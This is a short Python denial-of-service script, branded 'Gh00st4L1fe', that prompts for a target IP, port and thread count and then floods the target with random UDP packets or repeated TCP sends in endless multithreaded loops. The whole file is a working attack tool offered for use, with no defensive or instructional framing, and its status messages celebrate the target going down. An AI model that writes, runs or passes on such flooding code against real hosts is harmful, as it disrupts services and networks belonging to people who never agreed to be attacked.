#!/usr/bin/env python3
import random
import socket
import threading

print("--> Gh00st4L1fe <--")
print("#-- TCP / UDP Flood --#")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Ghost per Connection:"))
threads = int(input(" Ghost Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[>]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sending some Ghost to Target")
		except:
			print("[!] Target now has been died please check that ip.")

def run2():
	data = random._urandom(16)
	i = random.choice(("[>]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sending some Ghost to Target")
		except:
			s.close()
			print("[*] Target now has been died please check that ip.")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()